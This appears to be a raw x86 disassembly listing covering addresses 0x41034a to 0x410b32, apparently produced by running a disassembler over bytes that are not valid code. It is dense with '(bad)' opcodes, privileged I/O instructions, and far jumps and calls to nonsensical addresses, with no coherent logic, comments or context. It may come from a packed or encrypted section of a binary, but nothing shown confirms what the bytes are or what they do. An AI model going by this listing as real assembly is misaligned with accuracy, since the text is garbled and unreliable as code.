  41034a:	(bad)  
  41034b:	test   eax,0xf5d553aa
  410350:	std    
  410351:	mov    esi,0x39cef9c7
  410356:	xor    BYTE PTR [ecx+0x7baed76b],0xee
  41035d:	mov    ebp,0x7c6fdef7
  410362:	icebp  
  410363:	mov    ebx,DWORD PTR [edi-0x4]
  410366:	add    BYTE PTR es:[edi-0x6dba0fb4],ch
  41036d:	xchg   ebp,eax
  41036e:	mov    ecx,0x9b0fb255
  410373:	scas   eax,DWORD PTR es:[edi]
  410374:	mov    bh,0x72
  410376:	add    eax,edi
  410378:	xor    eax,0x870ffcc8
  41037d:	ret    
  41037e:	(bad)  
  41037f:	jbe    0x410336
  410381:	pop    edx
  410382:	mov    ch,0xbe
  410384:	or     eax,0x8517711e
  410389:	sahf   
  41038a:	scas   al,BYTE PTR es:[edi]
  41038b:	inc    ecx
  41038c:	mov    edi,DWORD PTR [eax+0x4c]
  41038f:	lods   al,BYTE PTR ds:[esi]
  410390:	das    
  410391:	lea    esp,[esi-0x1a370ab4]
  410397:	jb     0x4103f1
  410399:	pop    esp
  41039a:	pop    esp
  41039b:	les    esp,FWORD PTR [ebp-0x76ef68b5]
  4103a1:	inc    esp
  4103a2:	adc    BYTE PTR [esi+eax*1],cl
  4103a5:	rcl    ebp,1
  4103a7:	aad    0x85
  4103a9:	aad    0xab
  4103ab:	push   edi
  4103ac:	mov    ds:0x12c7a7a7,eax
  4103b1:	mov    eax,0xce822448
  4103b6:	into   
  4103b7:	dec    esi
  4103b8:	mov    edx,DWORD PTR [eax+ecx*8+0x3d]
  4103bc:	mov    ds:0xc5312584,eax
  4103c1:	cdq    
  4103c2:	xlat   BYTE PTR ds:[ebx]
  4103c3:	jmp    0xabc1945b
  4103c8:	or     DWORD PTR ds:[ebx],0xc130e0d
  4103cf:	push   es
  4103d0:	mov    eax,ds:0xc7c60a28
  4103d5:	mov    DWORD PTR [edi-0x42108422],0x78da883
  4103df:	inc    ecx
  4103e0:	inc    ecx
  4103e1:	popa   
  4103e2:	rol    DWORD PTR [edx],1
  4103e4:	xor    BYTE PTR ds:0xb85ddcdb,ah
  4103ea:	sub    ah,BYTE PTR [eax+esi*4+0x12]
  4103ee:	add    dl,al
  4103f0:	call   0x9da6cf96
  4103f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103f6:	add    edi,edx
  4103f8:	or     BYTE PTR ds:[edx+0x45],0x87
  4103fd:	popa   
  4103fe:	push   esp
  4103ff:	push   eax
  410400:	sub    dl,BYTE PTR ds:0xb58b8b1
  410406:	push   cs
  410407:	push   ecx
  410408:	sbb    DWORD PTR [edx+0x29],edi
  41040b:	aam    0x86
  41040d:	sub    al,0xd3
  41040f:	sub    BYTE PTR [eax+0x23],al
  410412:	rcr    BYTE PTR [esp+ecx*1],cl
  410415:	push   es
  410416:	rcr    ebx,1
  410418:	fisttp DWORD PTR [ebx]
  41041a:	mov    edi,0x50f96fdf
  41041f:	hlt    
  410420:	push   ecx
  410421:	push   ebx
  410422:	inc    esp
  410423:	mov    edi,0xcd582850
  410428:	cmp    BYTE PTR [ebx],al
  41042a:	add    eax,DWORD PTR [ebx]
  41042c:	(bad)  
  41042d:	inc    eax
  41042e:	call   0x8c05:0xa1481f4
  410435:	lea    ecx,[ebp+0x14747461]
  41043b:	mov    ecx,0x72e50e5c
  410440:	sbb    DWORD PTR [ebx],ecx
  410442:	or     ecx,DWORD PTR [ebx]
  410444:	ret    
  410445:	ret    
  410446:	ret    
  410447:	ret    
  410448:	(bad)  
  410449:	ds aaa 
  41044b:	aaa    
  41044c:	pop    ss
  41044d:	stos   DWORD PTR es:[edi],eax
  41044e:	push   esp
  41044f:	sub    al,BYTE PTR [ebp-0x60]
  410452:	sub    DWORD PTR [ebp-0x49],ebx
  410455:	or     al,0xa0
  410457:	(bad)  
  410459:	fistp  QWORD PTR [edi-0xa01416]
  41045f:	cli    
  410460:	std    
  410461:	mov    ebx,0x72feef77
  410466:	ja     0x4104df
  410468:	mov    bh,0xdb
  41046a:	out    dx,eax
  41046b:	test   ebx,0x7159f3e7
  410471:	add    ebp,edx
  410473:	call   0x69d3:0xa4ffa34a
  41047a:	arpl   WORD PTR [eax+0x78],di
  41047d:	clc    
  41047e:	fdivr  st,st(3)
  410480:	out    dx,eax
  410481:	mov    edi,0x6a6a607f
  410486:	push   0xffffffcc
  410488:	xor    al,0x4d
  41048a:	or     eax,0x445d8d0d
  41048f:	inc    ebx
  410490:	shr    ebx,cl
  410492:	pop    eax
  410493:	dec    edx
  410494:	add    ah,bl
  410496:	add    eax,0x91001190
  41049b:	inc    eax
  41049c:	popa   
  41049d:	int    0x9a
  41049f:	xor    eax,0xfa3e8fdd
  4104a4:	call   0xd33b63bc
  4104a9:	xchg   edi,eax
  4104aa:	mov    esi,0xc34dc007
  4104af:	test   BYTE PTR [ecx],dl
  4104b1:	in     al,dx
  4104b2:	and    dl,dl
  4104b4:	sbb    al,0xe2
  4104b6:	(bad)  
  4104b7:	sub    ebp,esi
  4104b9:	outs   dx,DWORD PTR ds:[esi]
  4104ba:	inc    edi
  4104bb:	add    al,0xb2
  4104bd:	jge    0x410493
  4104bf:	pushf  
  4104c0:	out    0x72,eax
  4104c2:	mov    ecx,0x65d5d5d0
  4104c7:	xchg   ebp,eax
  4104c8:	mov    ds:0x97e98591,eax
  4104cd:	imul   eax,DWORD PTR [edx-0x56],0x3
  4104d1:	scas   eax,DWORD PTR es:[edi]
  4104d2:	mov    bh,0xb8
  4104d4:	dec    ebp
  4104d5:	scas   al,BYTE PTR es:[edi]
  4104d6:	or     ebp,0x4c
  4104d9:	cmp    cl,BYTE PTR [ebp-0x5c]
  4104dc:	inc    ecx
  4104dd:	dec    edx
  4104de:	inc    ecx
  4104df:	xlat   BYTE PTR ds:[ebx]
  4104e0:	jne    0x4104ae
  4104e2:	int    0xcd
  4104e4:	popa   
  4104e5:	jbe    0x41055d
  4104e7:	(bad)  
  4104e8:	dec    edx
  4104e9:	fsub   DWORD PTR [ecx]
  4104eb:	and    DWORD PTR [edi+edx*8],esp
  4104ee:	jno    0x4104c5
  4104f0:	stos   BYTE PTR es:[edi],al
  4104f1:	push   ebp
  4104f2:	pop    eax
  4104f3:	mov    bl,0x66
  4104f5:	dec    ebp
  4104f6:	lods   eax,DWORD PTR ds:[esi]
  4104f7:	stc    
  4104f8:	scas   eax,DWORD PTR es:[edi]
  4104f9:	adc    dh,BYTE PTR ds:[ebx]
  4104fc:	add    eax,0x84fe6927
  410501:	bound  esi,QWORD PTR [ecx-0x2afcee98]
  410507:	push   edi
  410508:	pushf  
  410509:	popf   
  41050a:	call   0x2fd0:0x91947bf
  410511:	pop    ecx
  410512:	sub    DWORD PTR [edi+ebp*4+0x7c],esi
  410516:	ds pop edi
  410518:	jns    0x410503
  41051a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41051b:	xchg   edi,eax
  41051c:	sahf   
  41051d:	pushf  
  41051e:	sahf   
  41051f:	sahf   
  410520:	into   
  410521:	mov    eax,ds:0x145c25d6
  410526:	jle    0x410541
  410528:	add    DWORD PTR [ecx+edx*8+0x8],edx
  41052c:	add    BYTE PTR [ebx],al
  41052e:	int    0x96
  410530:	loop   0x410559
  410532:	and    al,BYTE PTR [edx+0x3d401095]
  410538:	jp     0x4104e7
  41053a:	sub    BYTE PTR ds:0xa00b26c1,dh
  410540:	(bad)  
  410541:	jb     0x4104ed
  410543:	jmp    0x41058a
  410545:	and    al,0x93
  410547:	xor    ebp,DWORD PTR [eax-0x73cf35ac]
  41054d:	or     dl,BYTE PTR [ebp+edx*2-0x7b]
  410551:	popa   
  410552:	push   esp
  410553:	lods   al,BYTE PTR ds:[esi]
  410554:	and    BYTE PTR [eax],ah
  410556:	std    
  410557:	dec    ecx
  410558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410559:	add    eax,0xac4847f8
  41055e:	dec    edi
  41055f:	inc    ecx
  410560:	lahf   
  410561:	inc    eax
  410562:	and    BYTE PTR [eax-0x5b5d703c],dh
  410568:	sbb    al,0x1a
  41056a:	pop    eax
  41056b:	xchg   ecx,eax
  41056c:	mov    dl,0xfb
  41056e:	inc    edx
  41056f:	mov    eax,ds:0x90c7d350
  410574:	retf   
  410575:	in     eax,0x30
  410577:	cmp    DWORD PTR [ecx],edi
  410579:	mov    ecx,ecx
  41057b:	leave  
  41057c:	dec    ecx
  41057d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41057e:	shr    DWORD PTR [ecx+0x54],cl
  410581:	sub    dl,BYTE PTR ds:0xe9d9b364
  410587:	push   0xc8c1fa34
  41058c:	enter  0x7c8,0xba
  410590:	scas   al,BYTE PTR es:[edi]
  410591:	push   ebx
  410592:	jbe    0x410532
  410594:	jge    0xee2b61b1
  41059a:	in     eax,dx
  41059b:	in     eax,dx
  41059c:	fnstcw WORD PTR [ebx-0x10681089]
  4105a2:	mov    ebx,0xd73bbeef
  4105a7:	scas   al,BYTE PTR es:[edi]
  4105a8:	pop    ebp
  4105a9:	sbb    esp,DWORD PTR [ecx]
  4105ab:	pop    edi
  4105ac:	int    0xeb
  4105ae:	cmc    
  4105af:	mov    ds:0x5b232e5c,al
  4105b4:	pop    ds
  4105b5:	and    ebx,DWORD PTR fs:[ebx+0x7f1d5acd]
  4105bc:	out    0xe7,al
  4105be:	out    0xa7,eax
  4105c0:	fidivr WORD PTR [ebx+esi*8-0x33]
  4105c4:	pop    edi
  4105c5:	lea    ecx,[esp+ecx*4-0x6aa85564]
  4105cc:	add    al,0x96
  4105ce:	or     edi,DWORD PTR ds:0xc9b7175f
  4105d4:	add    eax,0x594166a0
  4105d9:	xchg   ebx,eax
  4105da:	pusha  
  4105db:	jno    0x4105ac
  4105dd:	sahf   
  4105de:	cmp    eax,0xe8fa3d77
  4105e3:	mov    ds:0xb55aac2f,eax
  4105e8:	jmp    0x50ae:0x439c940b
  4105ef:	sub    ebp,ebp
  4105f1:	or     dh,BYTE PTR cs:[edi+edi*2]
  4105f5:	fbld   TBYTE PTR [edx+0x45d72f60]
  4105fb:	push   0xc4886965
  410600:	loopne 0x4105f5
  410602:	stc    
  410603:	lods   al,BYTE PTR ds:[esi]
  410604:	call   FWORD PTR [ebp+0x2e5ca088]
  41060a:	mov    ds:0x54a02850,eax
  41060f:	sub    bl,BYTE PTR [ecx-0x3d]
  410612:	ret    
  410613:	mov    DWORD PTR [edx],ecx
  410615:	adc    DWORD PTR [ebx-0x145e8d40],0x9f3e7c3a
  41061f:	aad    0xe7
  410621:	test   BYTE PTR [ebx+0x4152a54a],dl
  410627:	cmp    bl,BYTE PTR [ebp+0x2c2c2c6]
  41062d:	mov    dh,0xc6
  410630:	jmp    0xdddd:0xd1079c43
  410637:	lea    edi,[esi-0x90bc142]
  41063d:	neg    BYTE PTR [edx+0x4d]
  410640:	mov    eax,0x569d9d9d
  410645:	ins    BYTE PTR es:[edi],dx
  410646:	xor    BYTE PTR [edx+0x40],0x4a
  41064a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41064b:	xchg   edx,eax
  41064c:	xor    eax,0x7e170fa2
  410651:	icebp  
  410652:	cmp    edx,DWORD PTR [esi-0x14287bef]
  410658:	mov    ch,0x5c
  41065a:	push   ecx
  41065b:	mov    bh,0xdb
  41065d:	lea    esp,[ebx-0x90170b9]
  410663:	popf   
  410664:	ja     0x410644
  410666:	jns    0x410677
  410668:	inc    eax
  410669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41066a:	pop    esi
  41066b:	jne    0x41066b
  41066d:	mov    edi,0x75f39093
  410672:	dec    edx
  410673:	fst    DWORD PTR [esi+0x4b027565]
  410679:	arpl   WORD PTR [esi],ax
  41067b:	sub    eax,edx
  41067d:	dec    edx
  41067e:	adc    al,BYTE PTR [ecx-0x5517fe1a]
  410684:	stos   BYTE PTR es:[edi],al
  410685:	clc    
  410686:	or     al,0xa3
  410688:	bound  esi,QWORD PTR [ecx+0x57fdef23]
  41068e:	sub    ah,ch
  410690:	popa   
  410691:	call   0x7340:0x2b7ad5
  410698:	or     BYTE PTR [edx+0x64c99cdf],dl
  41069e:	push   0x35
  4106a0:	gs jg  0x41065d
  4106a3:	stos   BYTE PTR es:[edi],al
  4106a4:	stos   BYTE PTR es:[edi],al
  4106a5:	(bad)  
  4106a6:	xor    BYTE PTR [edx+0x64],bl
  4106a9:	inc    esi
  4106aa:	adc    ch,BYTE PTR [eax]
  4106ac:	imul   ebp,DWORD PTR [edi],0xffffff99
  4106af:	dec    esp
  4106b0:	pop    edx
  4106b1:	leave  
  4106b2:	adc    al,0xa1
  4106b4:	push   eax
  4106b5:	or     BYTE PTR [ebx],al
  4106b7:	add    eax,DWORD PTR [ebx]
  4106b9:	dec    ebp
  4106ba:	or     BYTE PTR [edi],0xd4
  4106bd:	sbb    BYTE PTR ds:[eax+0x2c],0x86
  4106c2:	jae    0x4106ab
  4106c4:	into   
  4106c5:	and    DWORD PTR [ebx-0x282caf37],edx
  4106cb:	inc    edx
  4106cc:	xor    al,0x1a
  4106ce:	cmp    eax,0xa5d2e97c
  4106d3:	ud2    
  4106d5:	test   DWORD PTR [edx+0xe],eax
  4106d8:	lea    ebp,[esi]
  4106da:	mov    ecx,0xba670cd4
  4106df:	(bad)  [esi-0x21]
  4106e2:	imul   ch
  4106e4:	fld    TBYTE PTR [edi-0x4]
  4106e7:	into   
  4106e8:	ja     0x4106a8
  4106ea:	repz cmc 
  4106ec:	sbb    ebp,DWORD PTR [esi-0x48]
  4106ef:	popa   
  4106f0:	xor    eax,0x142604d
  4106f5:	and    edx,esi
  4106f7:	scas   eax,DWORD PTR es:[edi]
  4106f8:	dec    ecx
  4106f9:	jmp    0x4106ca
  4106fb:	iret   
  4106fc:	iret   
  4106fd:	arpl   WORD PTR [esi+0x66],sp
  410700:	data16 div ah
  410703:	jmp    0xf4c0b6db
  410708:	rol    DWORD PTR [edi-0x39],1
  41070b:	repnz stc 
  41070d:	cld    
  41070e:	and    bl,BYTE PTR [eax+0x53]
  410711:	sbb    al,0x9a
  410713:	jge    0x410790
  410715:	(bad)  
  410717:	dec    ebx
  410718:	add    eax,0x917ffd4b
  41071d:	add    BYTE PTR [edx+edi*1],dl
  410720:	jle    0x410721
  410722:	std    
  410723:	neg    edi
  410725:	repz clc 
  410727:	jecxz  0x4106b8
  410729:	mov    edi,0xbb972e5a
  41072e:	retf   
  41072f:	in     eax,0xf2
  410731:	xchg   edx,eax
  410732:	adc    DWORD PTR [edx+0x75c57eed],eax
  410738:	jno    0x410759
  41073a:	pop    ss
  41073b:	and    al,BYTE PTR cs:[esi+ecx*2]
  41073f:	rcr    ah,cl
  410741:	mov    WORD PTR [edi],ss
  410743:	test   esi,ebx
  410745:	cs mov dh,0x60
  410748:	inc    edi
  410749:	adc    al,0x94
  41074b:	sbb    BYTE PTR [esp+eiz*4+0x15],al
  41074f:	mov    DWORD PTR [esp+ebp*1-0xd],eax
  410753:	fwait
  410754:	call   0x5ff7:0xe73fc94a
  41075b:	add    DWORD PTR cs:[eax+0x142851eb],edx
  410762:	lods   al,BYTE PTR ds:[esi]
  410763:	add    DWORD PTR [eax+edi*2-0x75],ebx
  410767:	add    ebp,DWORD PTR ds:0x4d34589c
  41076d:	inc    ebx
  41076e:	cs xchg edi,eax
  410770:	inc    ebx
  410771:	sub    al,0x16
  410773:	mov    bl,0xc6
  410775:	jp     0x410763
  410777:	jmp    0x410764
  410779:	inc    ebx
  41077a:	cmp    BYTE PTR [esi+eax*2],bl
  41077d:	sub    BYTE PTR [edx+eax*2],dl
  410780:	xor    BYTE PTR [eax],bl
  410782:	inc    esp
  410783:	and    BYTE PTR [eax],dl
  410785:	mov    al,0xd2
  410787:	(bad)  
  410788:	sub    esi,ebx
  41078a:	les    ebx,FWORD PTR [ebx+0x20962977]
  410790:	ds stos DWORD PTR es:[edi],eax
  410792:	dec    eax
  410793:	pop    esi
  410794:	xor    al,0xb2
  410796:	jae    0x4107c2
  410798:	xchg   ebp,eax
  410799:	ret    0xfdfe
  41079c:	sti    
  41079d:	jmp    FWORD PTR [edi-0x5b]
  4107a0:	push   edx
  4107a1:	jno    0x410744
  4107a3:	adc    DWORD PTR [eax+0x26],esp
  4107a6:	mov    eax,ds:0xb65c8516
  4107ab:	cs xchg edx,eax
  4107ad:	add    eax,edx
  4107af:	dec    esp
  4107b0:	push   es
  4107b1:	ror    BYTE PTR [edx],0x89
  4107b4:	pusha  
  4107b5:	fld    DWORD PTR [eax+eiz*2]
  4107b8:	sbb    BYTE PTR [esi-0x54a952af],al
  4107be:	and    BYTE PTR [edx+0x31],0xa4
  4107c2:	popa   
  4107c3:	push   esp
  4107c4:	jmp    0xed4f:0x1f4d1bda
  4107cb:	test   ebp,edx
  4107cd:	rol    BYTE PTR [eax-0x46505337],cl
  4107d3:	or     DWORD PTR ds:0x2ba8a7c6,ecx
  4107d9:	stc    
  4107da:	inc    esi
  4107db:	mov    esp,0xdd469f0d
  4107e0:	leave  
  4107e1:	xlat   BYTE PTR ds:[ebx]
  4107e2:	sti    
  4107e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107e4:	push   ebx
  4107e5:	scas   eax,DWORD PTR es:[edi]
  4107e6:	cmp    al,0x8a
  4107e8:	or     DWORD PTR [eax+0x56ad5539],edx
  4107ee:	sub    eax,0x48913edf
  4107f3:	and    BYTE PTR [edi+0x2c58a1cb],dl
  4107f9:	push   0xfffffff1
  4107fb:	js     0x4107f9
  4107fd:	je     0x410821
  4107ff:	xchg   ecx,eax
  410800:	sbb    BYTE PTR [edi+0x58],bl
  410803:	pop    eax
  410804:	cwde   
  410805:	aam    0x34
  410807:	sub    eax,0x7e09a85
  41080c:	rcl    DWORD PTR [eax],1
  41080e:	jl     0x41088d
  410810:	fnstsw WORD PTR [edx-0x941e48b]
  410816:	mov    ch,0xaf
  410818:	jge    0x410813
  41081a:	(bad)  
  41081b:	sbb    ebp,DWORD PTR [edi-0x24]
  41081e:	mov    al,0x79
  410820:	repz out 0x35,al
  410823:	popf   
  410824:	popf   
  410825:	popf   
  410826:	xchg   esi,eax
  410827:	fstp   DWORD PTR [eax-0x49]
  41082a:	sbb    dl,BYTE PTR [eax+0x2c]
  41082d:	push   ss
  41082e:	mov    cl,0xb8
  410830:	mov    eax,0x59d9d988
  410835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410836:	shr    ecx,cl
  410838:	jmp    0x3f8f:0x89e8e8e8
  41083f:	(bad)  
  410840:	clc    
  410841:	std    
  410842:	mov    DWORD PTR [ecx-0x60cf077],ecx
  410848:	cld    
  410849:	add    bl,BYTE PTR [edx]
  41084b:	mov    esi,0x316c1739
  410850:	rol    bh,1
  410852:	test   DWORD PTR [ebp-0x132e8184],ebx
  410858:	out    0xc2,eax
  41085a:	pop    edi
  41085b:	add    eax,0x6db6d950
  410860:	fwait
  410861:	out    dx,eax
  410862:	mov    eax,ds:0xf27a1e87
  410867:	out    dx,al
  410868:	mov    ebx,0x5d47feef
  41086d:	xlat   BYTE PTR ds:[ebx]
  41086e:	mov    ebx,0x256a92c9
  410873:	cld    
  410874:	sbb    al,0x76
  410876:	inc    esp
  410877:	and    BYTE PTR [ebx],bh
  410879:	xchg   edi,eax
  41087a:	cvtps2pd xmm1,xmm2
  41087d:	popa   
  41087e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41087f:	icebp  
  410880:	mov    ecx,0xb3615f99
  410885:	and    DWORD PTR [ecx+0x64170596],ecx
  41088b:	push   ecx
  41088c:	dec    eax
  41088d:	fsubr  QWORD PTR [esi+0x37]
  410890:	cld    
  410891:	(bad)  
  410892:	fisub  DWORD PTR [eax-0x2fbd2360]
  410898:	jmp    0x41082b
  41089a:	cld    
  41089b:	push   edx
  41089c:	test   eax,0x672e5c84
  4108a1:	or     DWORD PTR [edx-0x184d1308],ebx
  4108a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a8:	rcr    DWORD PTR [eax+0x49],0x91
  4108ac:	enter  0x9116,0xc
  4108b0:	call   0xac9d62f0
  4108b5:	gs in  eax,0x26
  4108b8:	xchg   ebx,eax
  4108b9:	dec    ecx
  4108ba:	jmp    0x4108f7
  4108bc:	and    BYTE PTR [ebx],cl
  4108be:	shr    bh,1
  4108c0:	mul    DWORD PTR [ebx]
  4108c2:	xchg   ebx,eax
  4108c3:	leave  
  4108c4:	or     al,0xb9
  4108c6:	fucomp st(6)
  4108c8:	mov    ecx,0xdfd7ebf5
  4108cd:	mov    dh,0x76
  4108cf:	in     eax,dx
  4108d0:	fisubr DWORD PTR [esi-0x61]
  4108d3:	iret   
  4108d4:	out    0x2a,eax
  4108d6:	adc    al,0xa
  4108d8:	shl    BYTE PTR [ebp-0x23],1
  4108db:	pop    edx
  4108dc:	sub    al,ch
  4108de:	dec    eax
  4108df:	out    dx,al
  4108e0:	inc    ebx
  4108e1:	and    BYTE PTR [eax],dl
  4108e3:	mov    al,0xac
  4108e5:	xchg   edx,eax
  4108e6:	push   0xe7f97a34
  4108eb:	aas    
  4108ec:	(bad)  
  4108ed:	stc    
  4108ee:	mov    bl,0xa7
  4108f0:	dec    esi
  4108f1:	popf   
  4108f2:	cmp    cl,BYTE PTR [esi+0x26e7f686]
  4108f8:	ds ja  0x4108fc
  4108fb:	(bad)  
  4108fc:	cmc    
  4108fd:	push   esi
  4108fe:	out    dx,al
  4108ff:	sub    DWORD PTR [edx],0xddae8f39
  410905:	push   ss
  410906:	retf   
  410907:	or     BYTE PTR es:[ebx-0x2231d0e9],0x72
  41090f:	retf   
  410910:	sub    eax,0xf2e5cbba
  410915:	push   ebx
  410916:	and    al,0xd5
  410918:	xor    al,0xd
  41091a:	aam    0x9a
  41091c:	retf   0xda6b
  41091f:	sahf   
  410920:	pop    es
  410921:	add    eax,0xb65f026b
  410926:	bound  eax,QWORD PTR [eax]
  410928:	cld    
  410929:	inc    ebx
  41092a:	icebp  
  41092b:	aam    0x13
  41092d:	xor    ah,al
  41092f:	pop    esi
  410930:	jns    0x4108f7
  410932:	(bad)  
  410934:	mov    ah,BYTE PTR [ebx+ebx*1+0x30608186]
  41093b:	mov    BYTE PTR [ecx+0x75740181],al
  410941:	jne    0x410904
  410943:	jmp    0x41093a
  410945:	pop    edx
  410946:	les    eax,FWORD PTR [ecx+0x6d]
  410949:	(bad)  
  41094a:	xchg   ebx,eax
  41094b:	xchg   ebx,eax
  41094c:	xchg   ebx,eax
  41094d:	mov    ch,al
  41094f:	(bad)  
  410950:	aam    0xde
  410952:	pop    ebp
  410953:	leave  
  410954:	out    0xf3,eax
  410956:	pop    ss
  410957:	xchg   DWORD PTR [esi+0x264cde86],eax
  41095d:	xchg   ebx,eax
  41095e:	xchg   ebx,eax
  41095f:	test   al,0x9
  410961:	daa    
  410962:	cmc    
  410963:	xchg   DWORD PTR [edi+0x7777a697],esp
  410969:	ja     0x410962
  41096b:	fdiv   QWORD PTR [edi-0x21]
  41096e:	jge    0x4109e7
  410970:	cmp    al,0xf4
  410972:	rol    BYTE PTR [ebx+0x77],1
  410975:	outs   dx,BYTE PTR ds:[esi]
  410976:	fdivr  QWORD PTR [eax-0x5dc1bbcf]
  41097c:	(bad)  
  41097d:	jecxz  0x410930
  41097f:	es cli 
  410981:	sub    BYTE PTR [edx+ecx*1],dl
  410984:	push   esi
  410985:	loopne 0x4109b7
  410987:	popf   
  410988:	dec    esi
  410989:	arpl   WORD PTR [esp+esi*2+0x74],si
  41098d:	call   0xafd4d376
  410992:	mov    WORD PTR [edi+0x3511ff8f],cs
  410998:	mov    edi,0x88b8989e
  41099d:	lods   ax,WORD PTR ds:[esi]
  41099f:	iret   
  4109a0:	or     DWORD PTR [eax-0x2c],eax
  4109a3:	hlt    
  4109a4:	mov    ah,0x90
  4109a6:	ror    BYTE PTR [ebx-0x6029bfb7],0xbb
  4109ad:	arpl   di,ax
  4109af:	mov    es,eax
  4109b1:	push   ebx
  4109b2:	dec    edi
  4109b3:	cmp    eax,0x3d3daff5
  4109b8:	cmp    eax,0x5a69a37f
  4109bd:	sar    DWORD PTR [edi+eax*1+0x2b7f34ed],cl
  4109c4:	or     esp,DWORD PTR [eax+0x39]
  4109c7:	out    0x88,eax
  4109c9:	in     eax,0x85
  4109cb:	imul   ebp,DWORD PTR [esi+edx*4-0x17db4408],0x92269cd4
  4109d6:	add    bl,BYTE PTR [ecx+0x12]
  4109d9:	mov    esp,0x6090b8bc
  4109de:	jp     0x41099d
  4109e0:	faddp  st(6),st
  4109e2:	cld    
  4109e3:	or     dh,BYTE PTR [ebp+0x52]
  4109e6:	enter  0x72e5,0xd0
  4109ea:	xor    al,0xcd
  4109ec:	pop    edx
  4109ed:	dec    eax
  4109ee:	mov    DWORD PTR [eax-0x48ab1413],ecx
  4109f4:	inc    edx
  4109f5:	mov    eax,ds:0xedf54560
  4109fa:	or     BYTE PTR [eax+0x8d03af],al
  410a00:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  410a02:	push   edx
  410a03:	mov    cl,0x12
  410a05:	sub    DWORD PTR [edx-0x4f],0xffffffae
  410a09:	xor    dh,BYTE PTR [edi+0x2d]
  410a0c:	cmp    ebx,DWORD PTR [edi+0x78]
  410a0f:	loope  0x410996
  410a11:	push   DWORD PTR [esi]
  410a13:	xor    eax,0xf7bc9535
  410a18:	fidivr WORD PTR [ebx-0x49]
  410a1b:	in     eax,dx
  410a1c:	fdiv   DWORD PTR [ecx-0x4110501d]
  410a22:	sti    
  410a23:	out    dx,al
  410a24:	ins    DWORD PTR es:[edi],dx
  410a25:	add    eax,DWORD PTR [ebx]
  410a27:	add    ebx,DWORD PTR [ebx-0x5]
  410a2a:	sti    
  410a2b:	sti    
  410a2c:	pop    es
  410a2d:	inc    edx
  410a2e:	mov    eax,ds:0x8c088790
  410a33:	xor    al,BYTE PTR [ecx+0x23]
  410a36:	cmc    
  410a37:	out    0xc6,al
  410a39:	mov    DWORD PTR [ecx+0x2f8bec89],ecx
  410a3f:	mov    esi,0x87c3fdf8
  410a44:	movsx  ecx,WORD PTR [ecx-0x4d8c0f66]
  410a4b:	xchg   edi,eax
  410a4c:	cdq    
  410a4d:	std    
  410a4e:	xor    dh,BYTE PTR [edx]
  410a50:	loopne 0x4109d4
  410a52:	scas   al,BYTE PTR es:[edi]
  410a53:	mov    al,0xf2
  410a55:	je     0x4109f3
  410a57:	xchg   esp,eax
  410a58:	or     BYTE PTR [edi-0x3f6d25e6],dh
  410a5e:	dec    edx
  410a5f:	sub    al,0x0
  410a61:	mov    bl,0xd9
  410a63:	xchg   DWORD PTR [eax+eax*2],esi
  410a66:	in     eax,dx
  410a67:	(bad)  
  410a68:	cmc    
  410a69:	iret   
  410a6a:	add    ebp,ecx
  410a6c:	add    eax,DWORD PTR [edx-0x12b715cc]
  410a72:	lock jl 0x410adb
  410a75:	push   esp
  410a76:	rcr    BYTE PTR [eax],cl
  410a78:	hlt    
  410a79:	xchg   edx,eax
  410a7a:	imul   ecx,DWORD PTR [edi*1-0x1280b8e6],0xeee8b5da
  410a85:	out    dx,al
  410a86:	outs   dx,BYTE PTR ds:[esi]
  410a87:	sbb    dh,BYTE PTR [edx+eiz*4+0x3e]
  410a8b:	mov    al,ds:0x3f9fce26
  410a90:	(bad)
  410a94:	inc    edx
  410a95:	mov    eax,ds:0xfe5c7f40
  410a9a:	ret    0xb85
  410a9d:	scas   eax,DWORD PTR es:[edi]
  410a9e:	dec    edi
  410a9f:	dec    esi
  410aa0:	dec    esi
  410aa1:	sahf   
  410aa2:	inc    esi
  410aa3:	dec    ebp
  410aa4:	sub    BYTE PTR ds:0x90cc2468,bh
  410aaa:	xchg   dh,dh
  410aac:	in     al,dx
  410aad:	fnstsw WORD PTR [ebx-0x7205409]
  410ab3:	(bad)  
  410ab4:	aaa    
  410ab5:	out    dx,al
  410ab6:	mov    ecx,0x22ebbaee
  410abb:	in     al,0x9b
  410abd:	xchg   ecx,eax
  410abe:	lahf   
  410abf:	dec    edx
  410ac0:	sbb    BYTE PTR [edi+0x3731e7cf],0x37
  410ac7:	xchg   DWORD PTR [ecx+0x122429a9],ebp
  410acd:	mov    esp,eax
  410acf:	mov    ecx,0x777ee773
  410ad4:	jmp    0x3ea8:0xf503a9d4
  410adb:	xor    eax,0x2f2d71cd
  410ae0:	adc    al,BYTE PTR [eax]
  410ae2:	sub    eax,0x66a5fb06
  410ae7:	inc    ebp
  410ae8:	pop    edx
  410ae9:	pop    ss
  410aea:	xchg   ebx,eax
  410aeb:	jg     0x410b65
  410aed:	fs mov bh,0xfa
  410af0:	enter  0x8f23,0x3c
  410af4:	fst    st(5)
  410af6:	aad    0xf5
  410af8:	aaa    
  410af9:	xor    al,0x93
  410afb:	or     al,0x60
  410afd:	das    
  410afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aff:	jbe    0x410b11
  410b01:	mov    DWORD PTR [eax+0x25],esp
  410b04:	inc    edx
  410b05:	das    
  410b06:	sahf   
  410b07:	ret    
  410b08:	and    ebx,esi
  410b0a:	xlat   BYTE PTR ds:[ebx]
  410b0b:	sub    eax,edi
  410b0d:	dec    edx
  410b0e:	and    esp,DWORD PTR [esi]
  410b10:	jae    0x410afd
  410b12:	cmp    ah,0x7e
  410b15:	jmp    0xaddc:0x2476460
  410b1c:	mov    al,ds:0xe3c79138
  410b21:	inc    ecx
  410b22:	ja     0x410b9b
  410b24:	aaa    
  410b25:	mov    edx,0xa951bbbb
  410b2a:	push   esp
  410b2b:	lods   al,BYTE PTR ds:[esi]
  410b2c:	les    ebx,FWORD PTR ds:0xb029df32
  410b32:	sub    BYTE PTR [edx+0x16e97523],dl
